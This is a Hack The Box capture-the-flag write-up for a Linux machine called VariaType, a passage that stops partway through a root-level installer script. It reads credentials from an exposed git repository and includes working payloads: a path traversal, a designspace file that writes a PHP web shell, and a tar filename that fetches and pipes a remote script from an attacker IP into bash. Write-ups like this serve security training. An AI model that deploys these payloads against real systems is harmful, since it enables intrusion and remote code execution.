---
title: VariaType
layout: post
released: 2026-03-15
creators: WackyH4cker
pwned: true
tags:
  - os/linux
  - diff/medium
category:
  - HTB
description: Variatype is running a service that allows users to upload designspaces files and fonts using the fonttype library. It's also running a portal with a git repository with cleartext credentials allowing us to login. Doing some digging we are able to find an arbitrary file read and are able to do a bit of source code analysis. We are then able to exploit an Arbitrary File Write in the designspace fonttools library processing that allows us to write a php script on the portal to gain a foothold. We can then find a bash script that processes fonts and is ran repeatedly, we're able to exploit the bash script's lack of proper sanitization against tar files and gain a shell as steve, the user. Finally we can exploit a sudo permission to run a plugin installation script with an arbitrary file upload to a python pth file and gain code execution as root.
image: ./assets/img/img_variatype/variatype-1773631863449.png
cssclasses:
  - custom_htb
---

![](/assets/img/img_variatype/variatype-1773631863449.png)
# Enumeration
## Scans
As usual we start off with an `nmap` port scan
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGaryOd6/hnIT9XPtT08U3YwVShW2VnKYno4lQqs0BQ6ePwGDjLxPcQHcEiiKWd0/mvv39jxHUQAgt069vYV8ag=
|   256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILtP5zMi+IdeNc7bOdDPDwFv+HWDAUakOFYbEIvNSp2z
80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
|_http-title: VariaType Labs \xE2\x80\x94 Variable Font Generator
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{:filename="nmap.txt"}

We find `2` open ports:
- `22 - Open SSH` running on a Debian server, not Ubuntu this time.
- `80 - nginx`

## VariaType webserver
Visiting the `nginx webserver` running on `port 80` we can find a `VariaType Labs` website about `Fonts`
![VariaType Labs website frontpage](/assets/img/img_variatype/variatype-1773632680153.png)

### File Upload
Clicking on `Generate Font` we can find a `file upload` endpoint where we can upload `.designspace` and `otf/ttf` files.
![Font Upload](/assets/img/img_variatype/variatype-1773632765675.png)

Doing a simple `google` search we can figure out pretty quickly that a `designspace` file is simply an [XML-based description of a multi-dimensional interpolation space](https://robofont.com/documentation/tutorials/creating-designspace-files/)  which is a part of the `fonttools` suite. 

## Portal Site
Running a quick `subdomain vhost` scan we can find the `portal` site.
```bash
$ ffuf -u http://variatype.htb -H "Host: FUZZ.variatype.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -mc all -fc 301

        / ___\  / ___\           / ___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://variatype.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
 :: Header           : Host: FUZZ.variatype.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 301
________________________________________________

portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 40ms]
```
{:filename="vhosts.txt"}

Adding this subdomain to our `/etc/hosts` file and visiting the site we're greeted with an `Internal Validation Portal`
![Internal Validation Portal](/assets/img/img_variatype/variatype-1773634510253.png)

Doing a `directory` fuzz we can also find that it has a `.git` file and that it's running `php`.
```bash
$ ffuf -u http://portal.variatype.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 

        / ___\  / ___\           / ___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://portal.variatype.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git/index              [Status: 200, Size: 137, Words: 2, Lines: 2, Duration: 34ms]
.git                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 52ms]
.git/logs/              [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 53ms]
.git/config             [Status: 200, Size: 143, Words: 14, Lines: 9, Duration: 53ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 54ms]
files                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 46ms]
index.php               [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 33ms]
```
{:filename="directory fuzz.txt"}

### Cleartext credentials in git repository
Let's run `git-dumper` against this.
```bash
$ git-dumper http://portal.variatype.htb .
[-] Testing http://portal.variatype.htb/.git/HEAD [200]
[-] Testing http://portal.variatype.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://portal.variatype.htb/.gitignore [404]
[-] http://portal.variatype.htb/.gitignore responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/description [200]
[-] Fetching http://portal.variatype.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/post-commit.sample [404]
[-] http://portal.variatype.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/post-receive.sample [404]
[-] http://portal.variatype.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/update.sample [200]
[-] Fetching http://portal.variatype.htb/.git/index [200]
[-] Fetching http://portal.variatype.htb/.git/info/exclude [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://portal.variatype.htb/.git/objects/info/packs [404]
[-] http://portal.variatype.htb/.git/objects/info/packs responded with status code 404
[-] Finding refs/
[-] Fetching http://portal.variatype.htb/.git/FETCH_HEAD [404]
[-] http://portal.variatype.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/ORIG_HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/info/refs [404]
[-] http://portal.variatype.htb/.git/info/refs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/config [200]
[-] Fetching http://portal.variatype.htb/.git/logs/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/main [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/staging [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/development [404]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/production [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/development responded with status code 404
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/packed-refs [404]
[-] http://portal.variatype.htb/.git/packed-refs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/stash [404]
[-] http://portal.variatype.htb/.git/logs/refs/stash responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/HEAD [404]
[-] Fetching http://portal.variatype.htb/.git/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/heads/production responded with status code 404
[-] http://portal.variatype.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/main [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/master [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/development [404]
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/staging [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/production [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/production responded with status code 404
[-] http://portal.variatype.htb/.git/refs/remotes/origin/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/stash [404]
[-] http://portal.variatype.htb/.git/refs/stash responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/development responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://portal.variatype.htb/.git/objects/75/3b5f5957f2020480a19bf29a0ebc80267a4a3d [200]
[-] Fetching http://portal.variatype.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://portal.variatype.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/objects/61/5e621dce970c2c1c16d2a1e26c12658e3669b3 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/6f/021da6be7086f2595befaa025a83d1de99478b [200]
[-] Fetching http://portal.variatype.htb/.git/objects/50/30e791b764cb2a50fcb3e2279fea9737444870 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/03/0e929d424a937e9bd079794a7e1aaf366bcfaf [200]
[-] Fetching http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 [200]
[-] Running git checkout .
```
{:filename="git dumper.sh"}

doing a little `git` recon we can find multiple commits.
```bash
$ git log                                          
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

commit 5030e791b764cb2a50fcb3e2279fea9737444870
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:57:57 2025 -0500

    feat: initial portal implementation
```
{:filename="git log.sh"}

Commit `753b5f~` has a message about adding a `gitbot` user, it's completely possible that the user was also added with a hardcoded password, let's take a look at this commit.
```bash
$ git show 753b5f5957f2020480a19bf29a0ebc80267a4a3d
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => '[REDACTED]'
+];
```
{:filename="gitbot password.diff"}

We've found hardcoded credentials in the `git` repository, let's use these to login.
![Portal home page](/assets/img/img_variatype/variatype-1773635196186.png)

Seems pretty simple but we can now do an authenticated `directory` fuzz so let's start with that.
```bash
$ ffuf -u http://portal.variatype.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -e .php -H "Cookie: PHPSESSID=9kb38m5t6gvdrseaqbg7ku6j89"

        / ___\  / ___\           / ___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://portal.variatype.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 :: Header           : Cookie: PHPSESSID=9kb38m5t6gvdrseaqbg7ku6j89
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

download.php            [Status: 200, Size: 24, Words: 3, Lines: 1, Duration: 32ms]
files                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 28ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
view.php                [Status: 200, Size: 18, Words: 3, Lines: 1, Duration: 24ms]
auth.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 30ms]
dashboard.php           [Status: 200, Size: 709, Words: 127, Lines: 30, Duration: 28ms]
```
{:filename="portal dirfuzz.sh"}

### Arbitrary File Read with File Traversal
We can find several `php` endpoints, `view.php` and `download.php` are rather interesting, `download.php` leads to: `File Parameter Required`. While `view.php` leads to: `Invalid filename`. Attempting `file` and `filename` as parameters didn't work so let's fuzz for parameter names.
```bash
$ ffuf -u http://portal.variatype.htb/download.php?FUZZ=/etc/passwd -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=9kb38m5t6gvdrseaqbg7ku6j89" -fs 24

        / ___\  / ___\           / ___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://portal.variatype.htb/download.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Cookie: PHPSESSID=9kb38m5t6gvdrseaqbg7ku6j89
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 24
________________________________________________

f                       [Status: 200, Size: 15, Words: 3, Lines: 1, Duration: 32ms]
:: Progress: [6453/6453] :: Job [1/1] :: 1250 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
{:filename="parameter fuzz.sh"}

We can find the `f` parameter on the `download.php` endpoint where we get the following message.
```
File not found
```
{:filename="Download Error.err"}

Attempting an `LFI` with `http://portal.variatype.htb/download.php?f=../../../../../../../../../../etc/passwd` doesn't seem to work, however attempting a simple filter bypass with: `http://portal.variatype.htb/download.php?f=....//....//....//....//....//....//....//....//....//....//etc/passwd`  we're able to get `/etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
variatype:x:102:110::/nonexistent:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
```
{:filename="/etc/passwd"}

We're able to read the source code of the `php` page using `/proc/self/cwd/download.php`
```bash
<?php
require_once 'auth.php';
require_login();[[]]

$file = $_GET['f'] ?? '';
if (!$file) {
    die('File parameter required.');
}

$file = str_replace("../", "", $file);

$filepath = '/var/www/portal.variatype.htb/public/files/' . $file;

if (!is_file($filepath)) {
    die('File not found.');
}

// Forzar descarga
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . basename($file) . '"');
header('Content-Length: ' . filesize($filepath));

readfile($filepath);
exit();
?>
```
{:filename="download.php"}

# User
## PHP Command execution via Arbitrary File Write
Taking a look around we can locate [CVE-2025-66034](https://nvd.nist.gov/vuln/detail/CVE-2025-66034) which is an `RCE` vulnerability in `fonttools varLib` library. Looking around we can find a [PoC](https://github.com/fonttools/fonttools/security/advisories/GHSA-768j-98cg-p3fv) for this. Running the `setup.py` script I'll be uploading the following `designspace` file.
```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
  </axes>
  
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location>
        <dimension name="Weight" xvalue="100"/>
      </location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location>
        <dimension name="Weight" xvalue="400"/>
      </location>
    </source>
  </sources>
  
  <!-- Filename can be arbitrarily set to any path on the filesystem -->
  <variable-fonts>
          <variable-font name="MaliciousFont" filename="../../../../../tmp/w1ld.json">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>

```
{:filename="Arbitrary File Write.xml"}

After uploading the `designspace` file and both `ttf` files I can check the uploaded file using the `Arbitrary File Read` we found earlier.
![w1ld.json](/assets/img/img_variatype/variatype-1773636904567.png)

Success! We have an `Arbitrary File Write`. Sine we know that `portal` is running `php` we can upload a `php` web shell using the second `PoC` we were provided.
```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
        <axes>
        <!-- XML injection occurs in labelname elements with CDATA sections -->
            <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
                <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']);?>]]]]><![CDATA[>]]></labelname>
                <labelname xml:lang="fr">MEOW2</labelname>
            </axis>
        </axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
        <sources>
                <source filename="source-light.ttf" name="Light">
                        <location>
                                <dimension name="Weight" xvalue="100"/>
                        </location>
                </source>
                <source filename="source-regular.ttf" name="Regular">
                        <location>
                                <dimension name="Weight" xvalue="400"/>
                        </location>
                </source>
        </sources>
        <variable-fonts>
                <variable-font name="MyFont" filename="../../../../../var/www/portal.variatype.htb/public/w1ld.php">
                        <axis-subsets>
                                <axis-subset name="Weight"/>
                        </axis-subsets>
                </variable-font>
        </variable-fonts>
        <instances>
                <instance name="Display Thin" familyname="MyFont" stylename="Thin">
                        <location><dimension name="Weight" xvalue="100"/></location>
                        <labelname xml:lang="en">Display Thin</labelname>
                </instance>
        </instances>
</designspace>
```
{:filename="Arbitrary File Write.xml"}

Let's attempt command execution.
```bash
$ curl http://portal.variatype.htb/w1ld.php?cmd=id | strings
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1025   0   1025   0      0  15500      0                              0
`HVAR
/OS/2@
`STATxph
cmap
,fvar~Wi
,glyf
gvar
head,
6hhea
$hmtx
loca
maxp
 name
 post
????
TestWeight400uid=33(www-data) gid=33(www-data) groups=33(www-data)
]]>ThinMEOW2
wght
wght
```
{:filename="Foothold.sh"}

Let's upgrade this to a `reverse shell`
```bash
www-data@variatype:~/portal.variatype.htb/public$ whoami
www-data
www-data@variatype:~/portal.variatype.htb/public$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{:filename="foothold.sh"}

Just like that, we have a foothold!
## Pivoting to Steve
Taking a look around we can find files that `steve` owns
```bash
www-data@variatype:/opt$ find / \( -user steve -o -group steve \) -exec ls -lash {} \; 2>/dev/null
4.0K -rwxr-xr-- 1 steve steve 2.0K Feb 26 07:50 /opt/process_client_submissions.bak
```
{:filename="process client submissions.sh"}

If we open up the file we can find a `bash script` that processes submissions.
```bash
#!/bin/bash
#
# Variatype Font Processing Pipeline
# Author: Steve Rodriguez <steve@variatype.htb>
# Only accepts filenames with letters, digits, dots, hyphens, and underscores.
#

set -euo pipefail

UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"

mkdir -p "$PROCESSED_DIR" "$QUARANTINE_DIR" "$(dirname "$LOG_FILE")"

log() {
    echo "[$(date --iso-8601=seconds)] $*" >> "$LOG_FILE"
}

cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; }

shopt -s nullglob

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

found_any=0
for ext in "${EXTENSIONS[@]}"; do
    for file in $ext; do
        found_any=1
        [[ -f "$file" ]] || continue
        [[ -s "$file" ]] || { log "SKIP (empty): $file"; continue; }

        # Enforce strict naming policy
        if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
            log "QUARANTINE: Filename contains invalid characters: $file"
            mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
            continue
        fi

        log "Processing submission: $file"

        if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
import sys
try:
    font = fontforge.open('$file')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process $file: {e}', file=sys.stderr)
    sys.exit(1)
"; then
            log "SUCCESS: Validated $file"
        else
            log "WARNING: FontForge reported issues with $file"
        fi

        mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file"
    done
done

if [[ $found_any -eq 0 ]]; then
    log "No eligible submissions found."
fi
```
{:filename="process client submissions.sh"}

There's a simple `REGEX` but it also takes in `tar` files and will indirectly run bash in the `filename` of the contents of the tar file after `fontforge` extracts it due to [CVE-2024-25081](https://nvd.nist.gov/vuln/detail/CVE-2024-25081). We can create the following exploit.
```bash
$ python3 << 'EOF'
import tarfile, io
name = '$(curl${IFS}http://10.10.14.9:3232/ra.sh|/bin/bash).ttf'
t = tarfile.open('exploit.tar', 'w')
info = tarfile.TarInfo(name=name)
info.size = 0
t.addfile(info, io.BytesIO(b''))
t.close()
print('done')
EOF
```
{:filename="Malicious Tar.py"}

After a while `steve` executes the `font processing script` and we get a callback on our listener!
```bash
steve@variatype:/tmp/ffarchive-5296-1$ whoami
steve
steve@variatype:/tmp/ffarchive-5296-1$ id
uid=1000(steve) gid=1000(steve) groups=1000(steve)
```
{:filename="steve.sh"}

Just like that, we have User!
# Root
## Arbitrary File Write as Root
Taking a look around we can run the `font-tools install validator` as `root` with `NOPASSWD`
```bash
steve@variatype:~$ sudo -l
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```
{:filename="sudo python permissions.sh"}

Let's take a look at `install_validator.py`
```python
#!/usr/bin/env python3
"""
Font Validator Plugin Installer
--------------------------------
Allows typography operators to install validation plugins
developed by external designers. These plugins must be simple
Python modules containing a validate_font() function.

Example usage:
  sudo /opt/font-tools/install_validator.py https://designer.example.com/plugins/woff2-check.py
"""

import os
import sys
import re
import logging
from urllib.parse import urlparse
from setuptools.package_index import PackageIndex

# Configuration
PLUGIN_DIR = "/opt/font-tools/validators"
LOG_FILE = "/var/log/font-validator-install.log"

# Set up logging
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ('http', 'https'), result.netloc])
    except Exception:
        return False

def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)

    logging.info(f"Attempting to install plugin from: {plugin_url}")

    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")
    except Exception as e:
        logging.error(f"Failed to install plugin: {e}")
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>")
        print("Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py")
        sys.exit(1)

    plugin_url = sys.argv[1]

    if not is_valid_url(plugin_url):
        print("[-] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    if plugin_url.count('/') > 10:
        print("[-] Suspiciously long URL. Aborting.")
        sys.exit(1)

